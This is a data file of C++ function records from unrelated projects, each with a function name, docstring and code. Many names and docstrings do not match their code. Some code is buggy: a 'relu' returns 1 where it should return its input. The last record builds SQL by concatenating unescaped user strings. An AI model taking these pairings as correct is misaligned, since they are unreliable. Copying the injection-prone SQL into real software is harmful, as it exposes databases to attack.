{"content":"{'function_name': 'p_GeoDaWeight__GetMeanNeighbors', 'docstring': '\/\/ invoke the function', 'code': 'double p_GeoDaWeight__GetMedianNeighbors(SEXP xp)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight\\n  Rcpp::XPtr<GeoDaWeight> ptr(xp);\\n\\n  \/\/ invoke the function\\n  return ptr->GetMedianNbrs();\\n}'}","id":582}
{"content":"{'function_name': 'find_points_at_shape_corners', 'docstring': '\/\/ See if to convert to local stereographic projection', 'code': 'std::pair<Eigen::Vector3d, Eigen::Vector3d>\\nbest_plane_from_points(const std::vector<Eigen::Vector3d> & c) {\\n  \\n  \/\/ Copy coordinates to a matrix in Eigen format\\n  size_t num_points = c.size();\\n  Eigen::Matrix<double, Eigen::Dynamic, Eigen::Dynamic > coord(3, num_points);\\n  for (size_t i = 0; i < num_points; i++)\\n    coord.col(i) = c[i];\\n  \\n  \/\/ calculate centroid\\n  Eigen::Vector3d centroid(coord.row(0).mean(), coord.row(1).mean(), coord.row(2).mean());\\n  \\n  \/\/ subtract centroid\\n  for (size_t i = 0; i < 3; i++) \\n    coord.row(i).array() -= centroid(i);\\n  \\n  \/\/ We only need the left-singular matrix here\\n  \/\/ http:\/\/math.stackexchange.com\/questions\/99299\/best-fitting-plane-given-a-set-of-points\\n  auto svd = coord.jacobiSvd(Eigen::ComputeThinU | Eigen::ComputeThinV);\\n  Eigen::Vector3d plane_normal = svd.matrixU().rightCols<1>();\\n  return std::make_pair(centroid, plane_normal);\\n}'}","id":584}
{"content":"{'function_name': 'do_reflect_coordinates', 'docstring': '\/\/m.translate_atoms(0.0, 0.0, zmin);', 'code': 'static int\\ndo_make_implicit_hydrogens_explicit (Molecule & m)\\n{\\n  int rc = 0;          \/\/ the number of atoms to which we add a Hydrogen\\n\\n  Molecule_to_Match target(&m);\\n\\n  int nq = atoms_for_implicit_hydrogens.number_elements();\\n  for (int i = 0; i < nq; i++)\\n  {\\n    Substructure_Results sresults;\\n\\n    int nhits = atoms_for_implicit_hydrogens[i]->substructure_search(target, sresults);\\n\\n    if (0 == nhits)\\n      continue;\\n\\n    for (int j = 0; j < nhits; j++)\\n    {\\n      const Set_of_Atoms * e = sresults.embedding(j);\\n\\n      atom_number_t a = e->item(0);      \/\/ we process only the first matched atom\\n\\n      if (0 == m.implicit_hydrogens(a))\\n        continue;\\n\\n      rc += m.make_implicit_hydrogens_explicit(a);\\n    }\\n  }\\n\\n  return rc;\\n}'}","id":585}
{"content":"{'function_name': 'relu', 'docstring': '\/\/may make it some constant * val in the future', 'code': 'double relu(double val) {\\n        if (val <= 0) {\\n            return 0;\\n        }\\n        return 1; \/\/may make it some constant in the future\\n    }'}","id":594}
{"content":"{'function_name': 'uint32_cnttz', 'docstring': '\/\/ COMPILER_', 'code': 'inline uint32_t uint64_cntbits(uint64_t _val)\\n\\t{\\n#if COMPILER_GCC || COMPILER_CLANG\\n\\t\\treturn __builtin_popcountll(_val);\\n#elif COMPILER_MSVC && ARCH_64BIT\\n\\t\\treturn uint32_t(__popcnt64(_val));\\n#else\\n\\t\\treturn uint64_cntbits_ref(_val);\\n#endif \/\/ COMPILER_\\n\\t}'}","id":602}
{"content":"{'function_name': 'unrollSnake', 'docstring': '\/\/ flash the screen 5 times\\r', 'code': 'void showHighscore() {\\r\\n  \/\/ lambda function that captures all variable within scope by reference\\r\\n  [&] {\\r\\n    for (int d = 0; d < sizeof(highScore[0]) - 7; d++) {\\r\\n      for (int col = 0; col < 8; col++) {\\r\\n        wait(messageSpeed);\\r\\n        for (int row = 0; row < 8; row++) {\\r\\n          \/\/ this reads the byte from the PROGMEM aka FLASH MEMORY and displays it on the screen\\r\\n          matrix.setLed(0, row, col, pgm_read_byte(&(highScore[row][col + d])));\\r\\n        }\\r\\n      }\\r\\n\\r\\n      \/\/ if the joystick is moved, exit the message\\r\\n      if (analogRead(yPin) < joystickDefault.y - joystickThreshold\\r\\n        || analogRead(yPin) > joystickDefault.y + joystickThreshold\\r\\n        || analogRead(xPin) < joystickDefault.x - joystickThreshold\\r\\n        || analogRead(xPin) > joystickDefault.x + joystickThreshold) {\\r\\n        return; \/\/ return the lambda function\\r\\n      }\\r\\n    }\\r\\n  }();\\r\\n\\r\\n  matrix.clearDisplay(0);\\r\\n\\r\\n  \/\/ wait for joystick co come back\\r\\n  while (analogRead(yPin) < joystickDefault.y - joystickThreshold\\r\\n    || analogRead(yPin) > joystickDefault.y + joystickThreshold\\r\\n    || analogRead(xPin) < joystickDefault.x - joystickThreshold\\r\\n    || analogRead(xPin) > joystickDefault.x + joystickThreshold) {\\r\\n  }\\r\\n}'}","id":603}
{"content":"{'function_name': 'denoiseb_rd5_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd6_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd6 read pattern: { denoiseb_update_0[d0, d1] -> raw[-1 + 2d0, -1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 2897 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_2897();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":605}
{"content":"{'function_name': 'make_lagrangian_local_cij_matrix', 'docstring': '\/\/ integration of order 2k', 'code': 'std::pair< Matrix<T, Dynamic, Dynamic> , Matrix<T, Dynamic, Dynamic> >\\nmake_bernstein_local_cij_matrix_with_velocity(const Mesh& msh, const typename Mesh::cell_type& cl, size_t degree,  Velocity& u ,size_t di = 1 )\\n{\\n    cell_basis_Bernstein<Mesh,T> cb(msh, cl, degree);\\n    auto cbs = cb.size();\\n\\n    Matrix<T, Dynamic, Dynamic> ret0 = Matrix<T, Dynamic, Dynamic>::Zero(cbs, cbs);\\n    Matrix<T, Dynamic, Dynamic> ret1 = Matrix<T, Dynamic, Dynamic>::Zero(cbs, cbs);\\n    \\n    \/\/ for Q1 , degree = 1-> integration of order 2\\n    auto qps = integrate(msh, cl, 2*(degree+di) ); \/\/ integration of order 2k\\n\\n    for (auto& qp : qps)\\n    {\\n        auto phi = cb.eval_basis(qp.first);\\n        \/\/std::cout<< \"phi \"<<\\'\\\\n\\'<<phi<<std::endl;\\n        auto phi_grad = cb.eval_gradients(qp.first);\\n        auto u_val = u(qp.first , msh , cl );\\n        \/\/std::cout<< \"phi_grad \"<<\\'\\\\n\\'<<phi_grad<<std::endl;\\n        ret0 += qp.second * u_val.first * phi * ((phi_grad).col(0)).transpose();\\n    \\n        ret1 += qp.second * u_val.second *phi * ((phi_grad).col(1)).transpose();\\n    }\\n    \\n    \\n    return std::make_pair(ret0,ret1);\\n}'}","id":606}
{"content":"{'function_name': 'CanRecoverFromError', 'docstring': '\/\/ have an upper bound.', 'code': 'std::vector<DownloadItem::ReceivedSlice> FindSlicesForRemainingContent(\\n    int64_t current_offset,\\n    int64_t total_length,\\n    int request_count,\\n    int64_t min_slice_size) {\\n  std::vector<DownloadItem::ReceivedSlice> new_slices;\\n\\n  if (request_count > 0) {\\n    int64_t slice_size =\\n        std::max<int64_t>(total_length \/ request_count, min_slice_size);\\n    slice_size = slice_size > 0 ? slice_size : 1;\\n    for (int i = 0, num_requests = total_length \/ slice_size;\\n         i < num_requests - 1; ++i) {\\n      new_slices.emplace_back(current_offset, slice_size);\\n      current_offset += slice_size;\\n    }\\n  }\\n\\n  \/\/ No strong assumption that content length header is correct. So the last\\n  \/\/ slice is always half open, which sends range request like \"Range:50-\".\\n  new_slices.emplace_back(current_offset, DownloadSaveInfo::kLengthFullContent);\\n  return new_slices;\\n}'}","id":610}
{"content":"{'function_name': 'pointToAngles', 'docstring': '\/\/\u83b7\u53d6\u53d8\u5316\u91cf,\u5e76\u7b97\u51fa\u7535\u673a\u5e94\u8f6c\u89d2\u5ea6', 'code': 'Point getPoint()\\n{\\n  Point point;\\n  pinMode(xLow, OUTPUT);\\n  pinMode(xHigh, OUTPUT);\\n  \\n  digitalWrite(xLow, LOW);\\n  digitalWrite(xHigh, HIGH);\\n\\n  digitalWrite(yLow, LOW);\\n  digitalWrite(yHigh, LOW);\\n\\n  pinMode(yLow, INPUT);\\n  pinMode(yHigh, INPUT);\\n\\n  float x = (analogRead(yLow) > 10) ? analogRead(yLow) : 511.5024;\\n  \/\/  float x = analogRead(yLow);\\n\\n  pinMode(yLow, OUTPUT);\\n  pinMode(yHigh, OUTPUT);\\n  \\n  digitalWrite(yLow, LOW);\\n  digitalWrite(yHigh, HIGH);\\n\\n  digitalWrite(xLow, LOW);\\n  digitalWrite(xHigh, LOW);\\n\\n  pinMode(xLow, INPUT);\\n  pinMode(xHigh, INPUT);\\n  \/\/delay(10);\\n\\n  float y = (analogRead(xLow) > 30) ? analogRead(xLow) : 496.02189;\/\/\u8fc7\u6ee4\\n\/\/     float y=analogRead(xLow);\\n\\n\/\/    Serial.print(x);\\n\/\/    Serial.print(\":\");\\n\/\/    Serial.println(y);\\n\\n\\n  point.x = 0.0201 * x - 10.2812; \/\/x= A1*X+C1;\\n  point.y = 0.0137 * y - 6.7955; \/\/y = A2*Y+C2;\\n\\n\/\/      Serial.println(\"==========point=========\");\\n\/\/      Serial.print(point.x);\\n\/\/      Serial.print(\":\");\\n\/\/      Serial.println(point.y);\\n\\n  return point;\\n\\n}'}","id":611}
{"content":"{'function_name': 'extra', 'docstring': '\/\/post-condition: returns the new array with no white spaces or upper case letters', 'code': 'bool palindrome(string &newinput, int first, int last){\\n    \/\/purpose: to identifie a string as a palindrome or not\\n    \/\/pre-condition: the adress of an array and the subscript of the first and last element of passed reference array\\n    \/\/post-condition: returns a true or false depending on wheather or not the string is a palindrome\\n    if (newinput[first] == newinput[last]) {\\n        if ((first - last) == 0) { \/\/base case if there is just one letter\\n            return true;\\n        }\\n        else if (first == (last - 1)){  \/\/base case if ther are only two letter\\n            return true;\\n        }\\n        else{\\n            return palindrome(newinput, first + 1, last - 1); \/\/recursive step\\n        }\\n    } else {\\n        return false;\\n    }\\n}'}","id":614}
{"content":"{'function_name': 'subarray_partitioner_from_capnp', 'docstring': \"\/\/ If cap'n proto object has stats set it on c++ object\", 'code': \"Status read_state_from_capnp(\\n    const Array* array,\\n    const capnp::ReadState::Reader& read_state_reader,\\n    Query* query,\\n    Reader* reader,\\n    ThreadPool* compute_tp) {\\n  auto read_state = reader->read_state();\\n\\n  read_state->overflowed_ = read_state_reader.getOverflowed();\\n  read_state->unsplittable_ = read_state_reader.getUnsplittable();\\n  read_state->initialized_ = read_state_reader.getInitialized();\\n\\n  \/\/ Subarray partitioner\\n  if (read_state_reader.hasSubarrayPartitioner()) {\\n    RETURN_NOT_OK(subarray_partitioner_from_capnp(\\n        query->stats(),\\n        reader->stats(),\\n        query->config(),\\n        array,\\n        read_state_reader.getSubarrayPartitioner(),\\n        &read_state->partitioner_,\\n        compute_tp,\\n        \/\/ If the current partition is unsplittable, this means we need to make\\n        \/\/ sure the tile_overlap for the current is computed because we won't go\\n        \/\/ to the next partition\\n        read_state->unsplittable_));\\n  }\\n\\n  return Status::Ok();\\n}\"}","id":615}
{"content":"{'function_name': 'updateGameInfo', 'docstring': '\/\/ 0 ~ TRACK_AMOUNT-1', 'code': 'GraphProperty drawInterleavedTrackAt(const GameStatus *game, int trackId, int trackPos) {\\n    \/\/ With color ver.\\n    #ifdef TOGGLE_SOLUTION\\n    if (game->m_adviceAnswerTrackPath[trackPos] == trackId) {\\n        if (game->m_trackStatusList[trackId].m_checkpoint & MASK_AT(trackPos)) {\\n            return GraphProperty(GraphProperty::GraphIcon::BAR, GraphProperty::GraphColor::YELLOW);\\n        } else {\\n            return GraphProperty(GraphProperty::GraphIcon::BAR, GraphProperty::GraphColor::BLUE);\\n        }\\n    } else\\n    #endif\\n    #ifdef CHECKPOINT_TRIGGER_EVENT\\n    if (game->m_trackStatusList[trackId].m_triggerCheckpoint & MASK_AT(trackPos)) {\\n        return GraphProperty(GraphProperty::GraphIcon::BAR, GraphProperty::GraphColor::RED);\\n    } else\\n    #endif\\n    if (game->m_trackStatusList[trackId].m_checkpoint & MASK_AT(trackPos)) {\\n        return GraphProperty(GraphProperty::GraphIcon::BAR, GraphProperty::GraphColor::GREEN);\\n    } else {\\n        return GraphProperty(GraphProperty::GraphIcon::BAR, GraphProperty::GraphColor::WHITE);\\n    }\\n    \/\/ Without color ver.\\n    \/\/ return GraphProperty(GraphProperty::GraphIcon::BAR, GraphProperty::GraphColor::WHITE);\\n}'}","id":617}
{"content":"{'function_name': 'isPosible', 'docstring': '\/\/\u5229\u7528originOrder\u8bb0\u5f55\u72b6\u6001', 'code': 'int main() {\\n\\tfreopen(\"test.txt\",\"r\",stdin);\\n\\tint testTimes;\\n\\tint trainNum, trainContain;\/\/\u706b\u8f66\u6570\u91cf\u662f\u6b63\u6570\uff0c\u4f46\u662f\u706b\u8f66\u5bb9\u91cf\u53ef\u80fd\u4e3a\u96f6,\u5747\u5c0f\u4e8e\u7b49\u4e8e1000\\n\\tint *testOrder,*originOrder;\\n\\tcin >> testTimes;\\n\\t\\n\\tfor (int i = 0; i < testTimes;++i) {\\n\\t\\tcin >> trainNum >> trainContain;\\n\\t\\ttestOrder = new int[trainNum];\\n\\t\\toriginOrder = new int[trainNum];\\n\\t\\tseqStack<int> station(trainContain);\\n\\t\\t\\n\\t\\tfor (int i = 0; i < trainNum;++i) {\\n\\t\\t\\tcin>>testOrder[i];\\n\\t\\t}\\n\\t\\tfor (int i = 0; i < trainNum; ++i) {\\n\\t\\t\\toriginOrder[i] = i;\\n\\t\\t}\\n\\t\\tif (isPosible(trainNum,station,testOrder,originOrder)) { \/\/\u8fd9\u91cc\u5982\u679c\u4e0d\u662f\u5f15\u7528\u4f20\u9012\uff0c\u8fd8\u8981\u6790\u6784\u4e00\u6b21\u5bfc\u81f4\u65e0\u6cd5\u83b7\u53d6\u5230\\n\\t\\t\\tcout << \"YES\" << endl;\\n\\t\\t}\\n\\t\\telse cout << \"NO\" << endl;\\n\\t}\\n\\t\\n\\treturn 0;\\n}'}","id":635}
{"content":"{'function_name': 'instru_funcs_module_load', 'docstring': '\/\/ Now write out the traced functions.', 'code': 'bool\\nfunc_trace_init(func_trace_append_entry_vec_t append_entry_vec_,\\n                ssize_t (*write_file)(file_t file, const void *data, size_t count),\\n                file_t funclist_file)\\n{\\n    \/\/ Online is not supported as we have no mechanism to pass the funclist_file\\n    \/\/ data to the simulator.\\n    if (!op_offline.get_value())\\n        return false;\\n\\n    if (append_entry_vec_ == NULL)\\n        return false;\\n\\n    if (dr_atomic_add32_return_sum(&func_trace_init_count, 1) > 1)\\n        return true;\\n\\n    init_funcs_str_and_sep();\\n    \/\/ If there is no function specified to trace,\\n    \/\/ then the whole func_trace module doesn\\'t have to do anything.\\n    if (funcs_str.empty())\\n        return true;\\n\\n    write_file_func = write_file;\\n    funclist_fd = funclist_file;\\n    funcs_wrapped_lock = dr_mutex_create();\\n    wrap_id = 0;\\n\\n    auto op_values = split_by(funcs_str, funcs_str_sep);\\n    std::set<std::string> existing_names;\\n    if (!drvector_init(&func_names, (uint)op_values.size(), false, free_func_entry) ||\\n        !drvector_init(&funcs_wrapped, (uint)op_values.size(), false, free_func_entry)) {\\n        DR_ASSERT(false);\\n        goto failed;\\n    }\\n    append_entry_vec = append_entry_vec_;\\n\\n    for (auto &single_op_value : op_values) {\\n        auto items = split_by(single_op_value, PATTERN_SEPARATOR);\\n        if (items.size() < 2 || items.size() > 3) {\\n            NOTIFY(0,\\n                   \"Error: -record_function or -record_heap_value only takes 2\"\\n                   \" or 3 fields for each function: %s\\\\n\",\\n                   funcs_str.c_str());\\n            return false;\\n        }\\n        std::string name = items[0];\\n        int arg_num = atoi(items[1].c_str());\\n        if (name.empty()) {\\n            NOTIFY(0, \"Error: -record_function name should not be empty\");\\n            return false;\\n        }\\n        if (existing_names.find(name) != existing_names.end()) {\\n            NOTIFY(0,\\n                   \"Warning: duplicated function name %s in -record_function or\"\\n                   \" -record_heap_value %s\\\\n\",\\n                   name.c_str(), funcs_str.c_str());\\n            continue;\\n        }\\n        if (name.size() > DRMEMTRACE_MAX_FUNC_NAME_LEN - 1 \/*newline*\/) {\\n            NOTIFY(0, \"The function name %s should not be larger than %d\\\\n\", name.c_str(),\\n                   DRMEMTRACE_MAX_FUNC_NAME_LEN - 1);\\n            return false;\\n        }\\n        if (arg_num > MAX_FUNC_TRACE_ENTRY_VEC_CAP - 2) {\\n            NOTIFY(0, \"The arg_num of the function %s should not be larger than %d\\\\n\",\\n                   funcs_str.c_str(), MAX_FUNC_TRACE_ENTRY_VEC_CAP - 2);\\n            return false;\\n        }\\n        bool noret = false;\\n        if (items.size() == 3) {\\n            if (items[2] == \"noret\") {\\n                noret = true;\\n            } else {\\n                NOTIFY(0, \"Unknown optional flag: %s\\\\n\", items[2].c_str());\\n                return false;\\n            }\\n        }\\n\\n        dr_log(NULL, DR_LOG_ALL, 1, \"Trace func name=%s, arg_num=%d\\\\n\", name.c_str(),\\n               arg_num);\\n        existing_names.insert(name);\\n        drvector_append(&func_names,\\n                        create_func_metadata(name.c_str(), 0, arg_num, noret));\\n    }\\n\\n    hashtable_init_ex(&pc2idplus1, 8, HASH_INTPTR, false \/*!strdup*\/, false \/*!synch*\/,\\n                      nullptr, nullptr, nullptr);\\n\\n    if (!op_record_dynsym_only.get_value()) {\\n        if (!(drsym_init(0) == DRSYM_SUCCESS)) {\\n            DR_ASSERT(false);\\n            goto failed;\\n        }\\n    }\\n    if (!drwrap_init()) {\\n        DR_ASSERT(false);\\n        goto failed;\\n    }\\n\\n    drwrap_set_global_flags(DRWRAP_NO_FRILLS);\\n    drwrap_set_global_flags(DRWRAP_FAST_CLEANCALLS);\\n    drwrap_set_global_flags(DRWRAP_SAFE_READ_RETADDR);\\n    drwrap_set_global_flags(DRWRAP_SAFE_READ_ARGS);\\n\\n    if (!drmgr_register_thread_init_event(event_thread_init) ||\\n        !drmgr_register_thread_exit_event(event_thread_exit)) {\\n        DR_ASSERT(false);\\n        goto failed;\\n    }\\n\\n    tls_idx = drmgr_register_tls_field();\\n    if (tls_idx == -1) {\\n        DR_ASSERT(false);\\n        goto failed;\\n    }\\n\\n    if (!drmgr_register_module_load_event(instru_funcs_module_load) ||\\n        !drmgr_register_module_unload_event(instru_funcs_module_unload)) {\\n        DR_ASSERT(false);\\n        goto failed;\\n    }\\n\\n    return true;\\nfailed:\\n    func_trace_exit();\\n    return false;\\n}'}","id":638}
{"content":"{'function_name': 'Motion', 'docstring': '\/\/glutPostRedisplay();', 'code': 'int main(int argc, char** argv)\\n{\\n\\t\\n\\tvector<float> sphere_vertices, axis_vertices, cone_vertices;\\n\\tvector<unsigned int> sphere_indices, axis_indices, cone_indices;\\n\\tvector<float> sphere_color_data, axis_color_data, cone_color_data;\\n\\n\\t\/\/Initialize the freeglut library\\n\\tglutInit(&argc, argv);\\n\\n\\t\/\/Specify the display mode\\n\\tglutInitDisplayMode(GLUT_RGBA);\\n\\n\\t\/\/Set the window size\/dimensions\\n\\tglutInitWindowSize(800, 800);\\n\\tglutInitWindowPosition(300, 300);\\n\\n\\t\/\/ Specify OpenGL version and core profile.\\n\\t\/\/ For newer cards, use (3, 3) or (4, 0).\\n\\t\/\/ For old cards or programming style, may have to remove calls below.\\n\\t\/\/ However, we only want to use recent versions, so avoid removing if possible!\\n\\tglutInitContextVersion(4, 0);\\n\\tglutInitContextProfile(GLUT_CORE_PROFILE);\\n\\n\\tglutCreateWindow(\"Assignment_03\");\\n\\n\\tglewExperimental = GL_TRUE;\\n\\n\\tif (glewInit())\\n\\t\\texit(EXIT_FAILURE);\\n\\n\\t\/\/ Set the shaders\\n\\tSetupShaders();\\n\\n\\t\/\/ Set transformation matrices\\n\\tSetMatrices();\\n\\n\\t\/\/ Create geometry\\n\\tCreateSphere(3, 3, sphere_vertices, sphere_indices, sphere_color_data, sphereRadius,vao1, vbo1, ibo1);\\n\\tCreateAxis(25, axis_vertices, axis_indices, axis_color_data, vao2, vbo2, ibo2);\\n\\tCreateCone(25, cone_vertices, cone_indices, cone_color_data, vao3, vbo3, ibo3);\\n\\t\\n\\t\/\/ Register a callback with glut that will handle drawing to the screen\\n\\tglutDisplayFunc(Display);\\n\\n\\t\/\/ Register a callback with glut that will handle keypresses\\n\\tglutKeyboardFunc(Keyboard);\\t\\n\\tglutMouseFunc(Mouse);\\n\\tglutMotionFunc(Motion);\\n\\tglutIdleFunc(Update);\\n\\t\\n\\t\\n\\t\\n\\t\/\/Transfer the control to glut processing loop.\\n\\tglutMainLoop();\\n\\t\\n\\treturn 0;\\n}'}","id":640}
{"content":"{'function_name': 'uint64_cntlz', 'docstring': '\/\/ COMPILER_', 'code': 'inline uint32_t uint64_cntlnz(uint64_t _val)\\n\\t{\\n#if COMPILER_GCC || COMPILER_CLANG\\n\\t\\treturn 31 - __builtin_clzll(_val);\\n#elif COMPILER_MSVC && PLATFORM_WINDOWS && ARCH_64BIT\\n\\t\\tunsigned long index;\\n\\t\\t_BitScanReverse64(&index, _val);\\n\\t\\treturn uint32_t(index);\\n#else\\n\\t\\treturn 31 - uint64_cntlz_ref(_val);\\n#endif \/\/ COMPILER_\\n\\t}'}","id":642}
{"content":"{'function_name': 'demosaic_bxb_demosaic_bx_update_0_read_bundle_read', 'docstring': '\/\/ demosaic_bx_rd1', 'code': 'inline hw_uint<16> demosaic_diff_rd0_select(demosaic_by_cache& demosaic_by, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaic_diff_rd0 read pattern: { demosaic_diff_update_0[d0, d1] -> demosaic_by[2d0, d1] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Read schedule : { demosaic_diff_update_0[d0, d1] -> [5 + d1, 3 + d0, 10] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Write schedule: { demosaic_by_update_0[d0, d1] -> [5 + d1, 3 + d0, 9] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ DD fold: {  }\\n  auto value_demosaic_by_demosaic_by_update_0_write0 = demosaic_by.demosaic_by_demosaic_by_update_0_write0_merged_banks_1.peek(\/* one reader or all rams *\/ 0);\\n  return value_demosaic_by_demosaic_by_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":645}
{"content":"{'function_name': 'fileIOreferrence', 'docstring': '\/\/\u6700\u540e\u9700\u8981\u4f7f\u7528fclose\u5173\u95ed\u6587\u4ef6\u6307\u9488', 'code': 'bool check_nullfile(void)\\n{\\n\\tFILE *fp = fopen(\"goodsinfo.txt\", \"r\");\\n\\t\/\/file not exist\\n\\tif (!fp) {\\n\\t\\tprintf(\"\u5546\u54c1\u4fe1\u606f\u521d\u59cb\u5316\u6587\u4ef6\u4e0d\u5b58\u5728\uff01\u7a0b\u5e8f\u5c06\u4e3a\u60a8\u65b0\u5efa\u4e00\u4e2a.\\\\n\");\\n\\t\\tFILE *fp = fopen(\"goodsinfo.txt\", \"w\");\\n\\t\\tfclose(fp);\\n\\n\\t\\treturn false;\\n\\t}\\n\\t\/\/file already exist\\n\\telse {\\n\\t\\tint temp;\\n\\t\\t\/\/res for try to read file if file null feof() can\\'t determine whether file is null or not\\n\\t\\tint res = fscanf(fp, \"%d\", &temp);\\n\\t\\tfclose(fp);\\n\\t\\tif (res <= 0)\\n\\t\\t{\\n\\t\\t\\tprintf(\"\u6587\u4ef6\u4e3a\u7a7a\");\\n\\t\\t\\treturn false;\\n\\t\\t}\\n\\t\\telse\\n\\t\\t\\treturn true;\\n\\t}\\n}'}","id":648}
{"content":"{'function_name': 'mapping_phi', 'docstring': '\/\/ mapping between 0 and 1', 'code': 'T time_step_CFL_L2_velocity_NEW( const DIAG& dii , const VEC& lumped_mass , const std::vector< bool >& Dirichlet_boundary , T& dt )\\n{\\n    T eps = 0.0;\\n    T tau_min  = dt;\\n    T CFL_numb = 10.0;\\n    T CFL_numb_max = -100.0 ;\\n    size_t i = 0 ;\\n    for (const auto& dir_elem : Dirichlet_boundary )\\n    {\\n        if(!dir_elem){\\n            if( (1 + 2*tau_min*dii(i)\/lumped_mass(i) ) < eps ){\\n                std::cout<<\"tau_min PRE modification is \"<<tau_min;\\n                tau_min = (eps-1.0)\/2.0*lumped_mass(i)\/dii(i);\\n                std::cout<<\" and tau_min POST modification is \"<<tau_min<<std::endl;\\n            }\\n            \/\/std::cout<<\"dii(i) =  \"<<dii(i)<<\" , lumped_mass(i) = \"<< lumped_mass(i)<<\" , tau_min = \"<< tau_min <<\", (1 + 2*tau_min*dii(i)\/lumped_mass(i) ) = \"<< (1 + 2*tau_min*dii(i)\/lumped_mass(i) ) << \" , ,(eps-1.0)\/2.0*lumped_mass(i)\/dii(i)  = \" <<(eps-1.0)\/2.0*lumped_mass(i)\/dii(i)  <<std::endl;\\n            CFL_numb = std::min( CFL_numb ,(eps-1.0)\/2.0*lumped_mass(i)\/dii(i) );\\n            CFL_numb_max = std::max( CFL_numb_max ,(eps-1.0)\/2.0*lumped_mass(i)\/dii(i) );\\n        }\\n        i++ ;\\n    }\\n    std::cout<<\"CFL_numb ---> \"<<CFL_numb<<std::endl;\\n    \/\/std::cout<<\"CFL_numb_max ---> \"<<CFL_numb_max<<std::endl;\\n    std::cout<<\"dt is \"<<dt<<\" and tau min is \"<<tau_min<<std::endl;\\n    dt = std::min(dt,tau_min);\\n    return CFL_numb;\\n}'}","id":650}
{"content":"{'function_name': 'norm_integrand_cuba', 'docstring': '\/\/ if(std::isinf(fval[0])) fval[0]=0.;', 'code': 'int density_integrand_cuba(const int ndim[],const double y[], const int*fdim, double fval[], void *fdata){\\n    double y2[3];\\n    density_st *P = (density_st *) fdata;\\n    for(int i=0;i<3;i++) y2[i]=(P->x2max[i]-P->x2min[i])*y[i]+P->x2min[i];\\n    VecDoub X = {P->x[0],P->x[1],P->x[2],y2[0],y2[1],y2[2]};\\n    VecDoub G = P->DF->realspace_dist_vec(X); \/\/ density\\n    double trigger = 1.;\\n    if(P->pp>=0 and G.size()>1){\\n        int tt = (int)(G[1]);\\n        if((P->pp)!=tt and !((P->pp)==2 and tt==3)) trigger=0.;\\n    }\\n    fval[0]=trigger*G[0];\\n    return 0;\\n}'}","id":653}
{"content":"{'function_name': 'update_world_annotation', 'docstring': '\/\/      cout << \"gis_database_ptr = \" << gis_database_ptr << endl;', 'code': 'string generate_update_world_annotation_SQL_command(\\n      int annotation_ID,double secs_since_epoch,\\n      string username,string label,string description,string color,\\n      int importance,double longitude,double latitude,double altitude)\\n   {\\n\/\/   cout << \"inside databasefunc::generate_update_world_annotation_SQL_command()\" << endl;\\n\\n      Clock clock;\\n      clock.convert_elapsed_secs_to_date(secs_since_epoch);\\n      string date_str=clock.YYYY_MM_DD_H_M_S();\\n      \\n      string SQL_command=\"UPDATE world_annotations\";\\n      SQL_command += \" SET creation_time=\\'\"+date_str+\"\\',\";\\n      SQL_command += \"event_time=\\'\"+date_str+\"\\',\";\\n\\n      if (username.size() > 0)\\n         SQL_command += \"username=\\'\"+username+\"\\',\";\\n      if (label.size() > 0)\\n         SQL_command += \"label=\\'\"+label+\"\\',\";\\n      if (description.size() > 0)\\n         SQL_command += \"description=\\'\"+description+\"\\',\";\\n      if (color.size() > 0)\\n         SQL_command += \"color=\\'\"+color+\"\\',\";\\n      if (importance > 0)\\n         SQL_command += \"importance=\"+stringfunc::number_to_string(\\n         importance)+\",\";\\n      if (altitude > 0.5*NEGATIVEINFINITY)\\n         SQL_command += \"altitude=\"+stringfunc::number_to_string(\\n            altitude);\\n\\n      if (longitude > 0.5*NEGATIVEINFINITY && latitude > 0.5*NEGATIVEINFINITY)\\n      {\\n         SQL_command += \"xy_posn=PointFromText(\\'POINT(\\' || \";\\n         SQL_command += stringfunc::number_to_string(longitude,9)+\" || \\' \\' || \";\\n         SQL_command += stringfunc::number_to_string(latitude,9)+\" || \\')\\',4326) \";\\n      }\\n      \\n      SQL_command += \" WHERE id = \"+stringfunc::number_to_string(\\n         annotation_ID)+\";\";\\n\\n      cout << SQL_command << endl;\\n      return SQL_command;\\n   }'}","id":655}
